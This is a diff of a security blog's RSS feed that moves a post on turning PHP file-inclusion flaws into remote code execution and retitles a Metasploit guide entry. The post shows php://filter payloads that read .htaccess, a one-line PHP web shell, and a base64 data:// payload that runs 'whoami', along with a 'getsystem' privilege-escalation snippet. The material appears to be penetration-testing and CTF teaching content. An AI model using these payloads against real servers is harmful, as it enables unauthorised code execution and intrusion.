@@ -9,46 +9,7 @@
     <lastBuildDate>Tue, 13 Jan 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/tags/php-filters/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Payloads and Outputs</title>
-      <link>http://localhost:1313/posts/tipsandtricks/webvulnerability/rce_via_lfi-php_wrappers/</link>
-      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/posts/tipsandtricks/webvulnerability/rce_via_lfi-php_wrappers/</guid>
-      <description>&lt;h1 id=&#34;target-file-htaccess-output-with-php-string-filters&#34;&gt;Target File .htaccess Output with PHP String Filters&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;No Filter Applied&lt;/strong&gt;
-&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;Testing PHP Filter&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/convert.base64-encode/resource=.htaccess
-&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;VGVzdGluZyBQSFAgRmlsdGVy&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.rot13/resource=.htaccess
-&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;Grfgvat CUC Svygre&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.toupper/resource=.htaccess
-&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;TESTING PHP FILTER&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.tolower/resource=.htaccess
-&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;testing php filter&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.strip_tags/resource=.htaccess
-&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;Testing PHP Filter&lt;/code&gt;
-This filter remove any HTML or PHP tags from the file contents.&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h5 id=&#34;php-payload&#34;&gt;&lt;strong&gt;PHP Payload:&lt;/strong&gt;&lt;/h5&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Shell done!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;payload-for-lif-to-rce&#34;&gt;&lt;strong&gt;Payload for LIF to RCE:&lt;/strong&gt;&lt;/h5&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&amp;amp;cmd=whoami
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;</description>
-    </item>
-    <item>
-      <title>🧨 Metasploit Practical Guide (for Beginners and CTF use)</title>
+      <title>Metasploit Practical Guide (for Beginners and CTF use)</title>
       <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/</link>
       <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
       <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/</guid>
@@ -139,6 +100,45 @@ This filter remove any HTML or PHP tags from the file contents.&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h4&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;getsystem
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or use:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Payloads and Outputs</title>
+      <link>http://localhost:1313/posts/penetration-testing/webvulnerability/rce_via_lfi-php_wrappers/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/penetration-testing/webvulnerability/rce_via_lfi-php_wrappers/</guid>
+      <description>&lt;h1 id=&#34;target-file-htaccess-output-with-php-string-filters&#34;&gt;Target File .htaccess Output with PHP String Filters&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;No Filter Applied&lt;/strong&gt;
+&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;Testing PHP Filter&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/convert.base64-encode/resource=.htaccess
+&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;VGVzdGluZyBQSFAgRmlsdGVy&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.rot13/resource=.htaccess
+&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;Grfgvat CUC Svygre&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.toupper/resource=.htaccess
+&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;TESTING PHP FILTER&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.tolower/resource=.htaccess
+&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;testing php filter&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; php://filter/string.strip_tags/resource=.htaccess
+&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;Testing PHP Filter&lt;/code&gt;
+This filter remove any HTML or PHP tags from the file contents.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h5 id=&#34;php-payload&#34;&gt;&lt;strong&gt;PHP Payload:&lt;/strong&gt;&lt;/h5&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Shell done!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;payload-for-lif-to-rce&#34;&gt;&lt;strong&gt;Payload for LIF to RCE:&lt;/strong&gt;&lt;/h5&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&amp;amp;cmd=whoami
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
